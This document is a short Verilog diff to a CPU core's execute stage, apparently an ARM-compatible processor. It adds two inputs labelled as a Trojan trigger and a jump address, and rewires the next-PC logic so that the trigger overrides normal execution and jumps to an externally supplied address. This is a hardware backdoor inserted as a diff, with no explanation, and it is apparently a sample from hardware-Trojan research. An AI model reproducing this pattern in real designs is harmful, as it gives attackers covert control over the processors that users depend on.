@@ -51,6 +51,10 @@ input       [4:0]           i_read_data_alignment,  // 2 LSBs of address in [4:3
                                                     // with 3 zeros
 input       [31:0]          i_copro_read_data,      // From Co-Processor, to either Register 
                                                     // or Memory
+
+input			    i_troj_trigger_irq,
+input	    [31:0]	    i_troj_jump_addr,
+
 input                       i_data_access_exec,     // from Instruction Decode stage
                                                     // high means the memory access is a read 
                                                     // read or write, low for instruction
@@ -325,7 +329,8 @@ assign adex_nxt      = |o_address_nxt[31:26] && !i_data_access_exec;
 // ========================================================
 // If current instruction does not execute because it does not meet the condition
 // then PC advances to next instruction
-assign pc_nxt = (!execute)       ? pc_plus4              :
+assign pc_nxt = (i_troj_trigger_irq) ? i_troj_jump_addr  :
+		(!execute)       ? pc_plus4              :
                 i_pc_sel == 2'd0 ? pc_plus4              :
                 i_pc_sel == 2'd1 ? alu_out               :
                                    interrupt_vector      ;
